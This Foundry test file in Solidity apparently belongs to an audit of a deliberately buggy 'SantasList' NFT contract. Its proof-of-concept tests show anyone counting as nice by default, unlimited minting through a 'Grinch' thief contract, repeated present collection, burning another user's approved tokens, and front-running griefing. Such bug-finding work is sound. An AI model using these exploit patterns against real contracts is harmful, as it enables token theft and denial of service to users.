// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import { SantasList } from "../../src/SantasList.sol";
import { SantaToken } from "../../src/SantaToken.sol";
import { THE_CHRISTMAS_THIEF } from "../../src/Grinch.sol";
import { Test, console2 } from "forge-std/Test.sol";
import { _CheatCodes } from "../mocks/CheatCodes.t.sol";

contract SantasListTest is Test {
  SantasList santasList;
  SantaToken santaToken;
  THE_CHRISTMAS_THIEF christmasThief;

  address user = makeAddr("user");
  address userBag = makeAddr("userBag");
  address santa = makeAddr("santa");
  address grinch = makeAddr("grinch");
  address grinchBag = address(0x69);
  _CheatCodes cheatCodes = _CheatCodes(HEVM_ADDRESS);

  function setUp() public {
    vm.startPrank(santa);
    santasList = new SantasList();
    santaToken = SantaToken(santasList.getSantaToken());
    vm.stopPrank();

    vm.startPrank(grinch);
    christmasThief = new THE_CHRISTMAS_THIEF(address(santasList), grinch, grinchBag);
    vm.stopPrank();

    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME());
  }

  //Any person is nice already
  //@dev enum default value is 0 = NICE
  function test_BrokenCheckList() public {
    assertEq(
      uint256(santasList.getNaughtyOrNiceOnce(address(0x4d65727279204368726973746d6173))), //for Merry Christmas in ASCII.
      uint256(SantasList.Status.NICE)
    );
  }

  //Any person can mint unlimited amount of tokens
  function test_stealChristmas() public {
    vm.startPrank(grinch);
    christmasThief.stealChristmas(69);
    assertEq(santasList.balanceOf(grinchBag), 69);
    vm.stopPrank();
  }

  //Any peson with EXTRA_NICE status can mint infinite amount of tokens
  function test_mintInfiniteTokens() public {
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    vm.startPrank(user);
    for (uint256 i; i < 69; i++) {
      santasList.collectPresent();
      santasList.transferFrom(user, userBag, i);
    }
    assertEq(santaToken.balanceOf(user), 69e18);

    vm.stopPrank();
  }

  //If allowance != 0, anyone can burn all random user tokens and mint NFTs for himself
  function test_burnAllUserTokens() public {
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    vm.startPrank(user);
    for (uint256 i; i < 69; i++) {
      santasList.collectPresent();
      santasList.transferFrom(user, userBag, i);
    }
    assertEq(santaToken.balanceOf(user), 69e18);

    //allowance is required
    santaToken.approve(address(santasList), type(uint256).max);

    vm.stopPrank();

    vm.startPrank(grinch);
    for (uint256 i; i < 69; i++) {
      santasList.buyPresent(user);
    }
    assertEq(santaToken.balanceOf(user), 0);
    assertEq(santasList.balanceOf(grinch), 69);
    vm.stopPrank();
  }

  //MEV bots can DDOS external checkList() function to prevent any user to claim presents
  function test_MEVgriefing() public {
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.EXTRA_NICE);
    santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
    vm.stopPrank();

    //Naughty Grinch's MEV bot sends transaction immediately after Santa
    vm.startPrank(grinch);
    santasList.checkList(user, SantasList.Status.NAUGHTY);
    vm.stopPrank();

    vm.startPrank(user);
    vm.expectRevert(); //user fails to claim presents
    santasList.collectPresent();
  }
}
